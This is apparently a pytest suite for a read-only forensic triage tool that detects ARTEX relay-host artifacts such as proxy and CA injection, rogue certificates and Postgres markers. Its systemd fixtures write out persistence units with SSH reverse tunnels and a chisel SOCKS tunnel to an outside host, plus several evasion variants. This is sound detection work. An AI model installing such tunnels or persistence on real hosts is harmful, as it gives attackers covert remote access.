"""Tests for strictly read-only ARTEX operator/transit-host forensic triage (`host_triage.py`)."""

from pathlib import Path

from artex_defense.host_triage import run_host_triage


def _write_proc_net_tcp(path: Path, listen_ports: list[int]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    lines = ["  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode"]
    for idx, port in enumerate(listen_ports):
        # 0100007F == 127.0.0.1, state 0A == TCP_LISTEN
        lines.append(
            f"   {idx}: 0100007F:{port:04X} 00000000:0000 0A 00000000:00000000 00:00000000 00000000 1000 0 {50000 + idx} 1 0 100 0 0 10 0"
        )
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def test_host_triage_reports_clean_on_benign_offline_host(tmp_path: Path) -> None:
    host = tmp_path / "clean_host"
    proc = host / "proc"
    _write_proc_net_tcp(proc / "net" / "tcp", [22, 443, 8080])  # 8080 alone must NOT alert!

    pid_dir = proc / "1234"
    pid_dir.mkdir(parents=True)
    (pid_dir / "cmdline").write_bytes(b"/usr/bin/python3\x00app.py\x00")
    (pid_dir / "environ").write_bytes(b"PATH=/usr/bin\x00HOME=/home/user\x00")

    ca_dir = host / "etc" / "ssl" / "certs"
    ca_dir.mkdir(parents=True)
    (ca_dir / "DigiCert_Global_Root_G2.pem").write_text("-----BEGIN CERTIFICATE-----\n", encoding="utf-8")

    app_dir = host / "opt" / "corp-app"
    app_dir.mkdir(parents=True)
    (app_dir / "config.json").write_text('{"env": "prod"}\n', encoding="utf-8")

    pg_file = tmp_path / "benign_pg.sql"
    pg_file.write_text("CREATE TABLE assets (id int); CREATE TABLE companies (id int);\n", encoding="utf-8")

    report = run_host_triage(fs_root=host, proc_root=proc, pg_schema_file=pg_file)
    assert report.verdict == "clean", f"Expected clean verdict, got findings: {report.findings}"
    assert report.finding_count == 0


def test_host_triage_detects_all_artex_operator_host_artifacts(tmp_path: Path) -> None:
    host = tmp_path / "compromised_relay"
    proc = host / "proc"
    # Listening on 8787 (console), 8788 (recording proxy), 8790 (worker API), and co-located 8080 (Sub2API)
    _write_proc_net_tcp(proc / "net" / "tcp", [8787, 8788, 8790, 8080])

    # Simulated worker subprocess with injected HTTP_PROXY + mitmproxy CA env vars
    pid_worker = proc / "4242"
    pid_worker.mkdir(parents=True)
    (pid_worker / "cmdline").write_bytes(b"/usr/bin/curl\x00-sSk\x00https://target.example\x00")
    (pid_worker / "environ").write_bytes(
        b"HTTP_PROXY=http://127.0.0.1:8788\x00"
        b"SSL_CERT_FILE=/opt/artex/traffic/_ca/mitmproxy-ca-cert.pem\x00"
    )

    # Installed rogue mitmproxy CA in system trust store
    ca_dir = host / "usr" / "local" / "share" / "ca-certificates"
    ca_dir.mkdir(parents=True)
    (ca_dir / "mitmproxy-ca-cert.crt").write_text("-----BEGIN CERTIFICATE-----\n", encoding="utf-8")

    # ARTEX spill dir, traffic sqlite, jwt.key, config, and audit guard framing
    spill = host / "opt" / "artex" / "tasks" / "104" / "i3185" / "cmd-output"
    spill.mkdir(parents=True)
    (spill / "001.txt").write_text("whoami\n", encoding="utf-8")

    traffic_idx = host / "opt" / "artex" / "traffic" / "_index"
    traffic_idx.mkdir(parents=True)
    (traffic_idx / "index.sqlite").write_bytes(b"SQLite format 3\x00")

    (host / "opt" / "artex" / "jwt.key").write_text("secret-key\n", encoding="utf-8")
    (host / "opt" / "artex" / "artex_config.json").write_text('{"mode": "auto"}\n', encoding="utf-8")
    (host / "opt" / "artex" / "audit.log").write_text(
        "blocked action: 【ARTEX 平台管控·非目标防御】 out of scope\n", encoding="utf-8"
    )

    # PostgreSQL dual-graph schema dump
    pg_file = tmp_path / "artex_pg_tables.txt"
    pg_file.write_text(
        "public | exploration_nodes | table\n"
        "public | assets            | table\n"
        "public | companies         | table\n"
        "public | activity          | table\n"
        "public | agent_prompts     | table\n",
        encoding="utf-8",
    )

    report = run_host_triage(fs_root=host, proc_root=proc, pg_schema_file=pg_file)
    assert report.verdict == "likely_artex_host"
    checks_hit = {f.check for f in report.findings}
    assert checks_hit == {
        "listening_ports",
        "proc_proxy_ca_injection",
        "filesystem_artifacts",
        "audit_and_log_markers",
        "installed_ca_certs",
        "postgres_dual_graph",
    }
    # Verify co-located 8080 was surfaced alongside the 3 ARTEX ports
    port_evidences = [f.evidence for f in report.findings if f.check == "listening_ports"]
    assert any("8787" in e for e in port_evidences)
    assert any("8788" in e for e in port_evidences)
    assert any("8790" in e for e in port_evidences)
    assert any("8080" in e for e in port_evidences)


def test_host_triage_hardening_boundaries_home_root_symlink_ca_and_pg_ddl(tmp_path: Path) -> None:
    """Permanent regression suite for Seat 1 / Seat 3 host_triage.py audit findings."""
    from artex_defense.host_triage import (
        _default_live_scan_specs,
        check_installed_ca_certs,
        check_postgres_dual_graph,
        check_proc_proxy_ca_injection,
    )

    # 1. [Seat 1] CMDLINE_ARTIFACT_RE must NOT match compound substrings (smartex, quartex, artex_logistics)
    #    or doc viewers opening markdown notes, while matching real artex-worker / artex-server processes.
    proc = tmp_path / "proc_fp"
    for pid, cmd in (
        ("101", b"/usr/bin/smartex-worker\x00--daemon\x00"),
        ("102", b"/usr/local/bin/quartex-daemon\x00"),
        ("103", b"python3\x00manage.py\x00--partner=artex_logistics\x00"),
        ("104", b"vim\x00artex_notes.md\x00"),
        ("105", b"less\x00/docs/artex.md\x00"),
        ("106", b"grep\x00artex\x00notes.md\x00"),
    ):
        d = proc / pid
        d.mkdir(parents=True)
        (d / "cmdline").write_bytes(cmd)
    assert check_proc_proxy_ca_injection(proc) == []

    real_pid = proc / "202"
    real_pid.mkdir(parents=True)
    (real_pid / "cmdline").write_bytes(b"/root/artex/artex-worker\x00--port\x008790\x00")
    real_hits = check_proc_proxy_ca_injection(proc)
    assert len(real_hits) == 1 and real_hits[0].path_or_pid == "pid:202"

    # 2. [Seat 3] Live scan specs include /root and /home capped at depth 4 (if present on host)
    specs = dict(_default_live_scan_specs(max_depth=6))
    if Path("/home").exists():
        assert specs[Path("/home")] == 4
    if Path("/root").exists():
        assert specs[Path("/root")] == 4

    # 3. [Seat 1] check_installed_ca_certs catches symlinked mitmproxy/artex CAs without following targets,
    #    while ignoring unrelated compound CA names like Smartex_Root_CA.pem
    ca_root = tmp_path / "ca_host"
    ssl_dir = ca_root / "etc" / "ssl" / "certs"
    ssl_dir.mkdir(parents=True)
    outside_pem = tmp_path / "outside_mitm.pem"
    outside_pem.write_text("-----BEGIN CERTIFICATE-----\n", encoding="utf-8")
    (ssl_dir / "mitmproxy-ca.pem").symlink_to(outside_pem)
    (ssl_dir / "Smartex_Root_CA.pem").write_text("-----BEGIN CERTIFICATE-----\n", encoding="utf-8")
    ca_hits = check_installed_ca_certs(ca_root)
    assert len(ca_hits) == 1
    assert "mitmproxy-ca.pem" in ca_hits[0].evidence

    # 4. [Seat 3] check_postgres_dual_graph ignores SQL comments, tiers 2 generic companions as high,
    #    and requires agent_prompts or >=3 companions in DDL/table context for critical.
    pg_comment_only = tmp_path / "comment_only.sql"
    pg_comment_only.write_text(
        "-- legacy note mentioning exploration_nodes and agent_prompts\n"
        "/* block comment exploration_nodes */\n"
        "CREATE TABLE assets (id int);\n"
        "CREATE TABLE companies (id int);\n"
        "CREATE TABLE activity (id int);\n",
        encoding="utf-8",
    )
    assert check_postgres_dual_graph(pg_comment_only) == []

    pg_two_generic = tmp_path / "two_generic.sql"
    pg_two_generic.write_text(
        "CREATE TABLE public.exploration_nodes (id int);\n"
        "CREATE TABLE public.assets (id int);\n"
        "CREATE TABLE public.companies (id int);\n",
        encoding="utf-8",
    )
    hits_two = check_postgres_dual_graph(pg_two_generic)
    assert len(hits_two) == 1 and hits_two[0].severity == "high"

    pg_with_prompts = tmp_path / "with_prompts.sql"
    pg_with_prompts.write_text(
        "CREATE TABLE IF NOT EXISTS public.exploration_nodes (id int);\n"
        "CREATE TABLE public.agent_prompts (id int);\n",
        encoding="utf-8",
    )
    hits_crit = check_postgres_dual_graph(pg_with_prompts)
    assert len(hits_crit) == 1 and hits_crit[0].severity == "critical"


def test_host_triage_systemd_persistence_catches_reverse_ssh_and_volatile_staging_with_zero_fp(tmp_path: Path) -> None:
    """check_systemd_persistence flags SSH -R reverse tunnels, volatile-path bins, and tunnel tools; ignores normal services."""
    from artex_defense.host_triage import check_systemd_persistence

    root = tmp_path / "systemd_host"
    unit_dir = root / "etc" / "systemd" / "system"
    unit_dir.mkdir(parents=True)

    # Benign stock services -> 0 hits
    (unit_dir / "sshd.service").write_text("[Service]\nExecStart=/usr/sbin/sshd -D\n", encoding="utf-8")
    (unit_dir / "nginx.service").write_text("[Service]\nExecStart=/usr/sbin/nginx -g 'daemon off;'\n", encoding="utf-8")
    (unit_dir / "ssh-local-fwd.service").write_text(
        "[Service]\nExecStart=/usr/bin/ssh -N -L 5432:127.0.0.1:5432 db@internal.local\n",
        encoding="utf-8",
    )
    # Benign remote commands over SSH containing `-r` or `-R` (must NOT FP as SSH reverse tunnel!)
    (unit_dir / "ssh-backup-cp.service").write_text(
        '[Service]\nExecStart=/usr/bin/ssh backup@internal.local "cp -r /srv/data /mnt/bak"\n',
        encoding="utf-8",
    )
    (unit_dir / "ssh-chmod-r.service").write_text(
        '[Service]\nExecStart=/usr/bin/ssh deploy@internal.local "chmod -R 750 /srv/app"\n',
        encoding="utf-8",
    )
    # Benign outbound proxy client units using `--socks5` / `socks5://` / `socks4://` (must NOT FP as tunnel server!)
    (unit_dir / "curl-socks5-feed.service").write_text(
        "[Service]\nExecStart=/usr/bin/curl --socks5 10.0.0.5:1080 https://updates.internal/feed\n",
        encoding="utf-8",
    )
    (unit_dir / "env-socks5-proxy.service").write_text(
        "[Service]\nExecStart=/usr/bin/env ALL_PROXY=socks5://proxy.corp.local:1080 /opt/app/worker\n",
        encoding="utf-8",
    )
    (unit_dir / "git-socks4-proxy.service").write_text(
        "[Service]\nExecStart=/usr/bin/git -c http.proxy=socks4://proxy.corp.local:1080 pull\n",
        encoding="utf-8",
    )
    # Symlink to outside unit must be skipped safely
    outside_unit = tmp_path / "outside.service"
    outside_unit.write_text("[Service]\nExecStart=/tmp/staged_agent\n", encoding="utf-8")
    (unit_dir / "linked.service").symlink_to(outside_unit)
    assert check_systemd_persistence(root) == []

    # Malicious custom units -> caught!
    (unit_dir / "rev-tunnel.service").write_text(
        "[Service]\nExecStart=-/usr/bin/ssh -o StrictHostKeyChecking=no -N -R 8080:127.0.0.1:22 relay@198.51.100.5\n",
        encoding="utf-8",
    )
    (unit_dir / "tmp-socks.service").write_text(
        "[Service]\nExecStart=/var/tmp/socks_srv --listen 127.0.0.1:1080\n",
        encoding="utf-8",
    )
    (unit_dir / "chisel-persist.service").write_text(
        "[Service]\nExecStart=/opt/tools/chisel client 198.51.100.5:443 R:socks\n",
        encoding="utf-8",
    )
    # Evasion variants: quoted path, sh -c wrapper, compact -fNR8080: bind, -oRemoteForward=, and `\` line continuation
    (unit_dir / "quoted-tmp.service").write_text(
        '[Service]\nExecStart="/tmp/staged_agent" --bg\n',
        encoding="utf-8",
    )
    (unit_dir / "sh-wrapper-vartmp.service").write_text(
        '[Service]\nExecStart=/bin/sh -c "/var/tmp/beacon.sh"\n',
        encoding="utf-8",
    )
    (unit_dir / "compact-ssh-r.service").write_text(
        "[Service]\nExecStart=/usr/bin/ssh -fNR8080:127.0.0.1:22 ops@198.51.100.5\n",
        encoding="utf-8",
    )
    (unit_dir / "opt-remotefwd.service").write_text(
        "[Service]\nExecStart=/usr/bin/ssh -N -oRemoteForward=8080 127.0.0.1:22 ops@198.51.100.5\n",
        encoding="utf-8",
    )
    (unit_dir / "multiline-ssh.service").write_text(
        "[Service]\nExecStart=/usr/bin/ssh \\\n  -N -R 9001:127.0.0.1:22 ops@198.51.100.5\n",
        encoding="utf-8",
    )
    (unit_dir / "quoted-ssh-bin.service").write_text(
        '[Service]\nExecStart="/usr/bin/ssh" -fNR8081:127.0.0.1:22 ops@198.51.100.5\n',
        encoding="utf-8",
    )
    (unit_dir / "socksnode.service").write_text(
        "[Service]\nExecStart=/usr/bin/python3 /usr/local/bin/socks5.py 127.0.0.1 10800\n",
        encoding="utf-8",
    )
    (unit_dir / "wildcard-ssh-r.service").write_text(
        "[Service]\nExecStart=/usr/bin/ssh -N -R *:8082:127.0.0.1:80 ops@198.51.100.5\n",
        encoding="utf-8",
    )

    hits = check_systemd_persistence(root)
    by_unit = {Path(h.path_or_pid).name: h.severity for h in hits}
    assert by_unit == {
        "rev-tunnel.service": "high",
        "tmp-socks.service": "high",
        "chisel-persist.service": "critical",
        "quoted-tmp.service": "high",
        "sh-wrapper-vartmp.service": "high",
        "compact-ssh-r.service": "high",
        "opt-remotefwd.service": "high",
        "multiline-ssh.service": "high",
        "quoted-ssh-bin.service": "high",
        "socksnode.service": "critical",
        "wildcard-ssh-r.service": "high",
    }
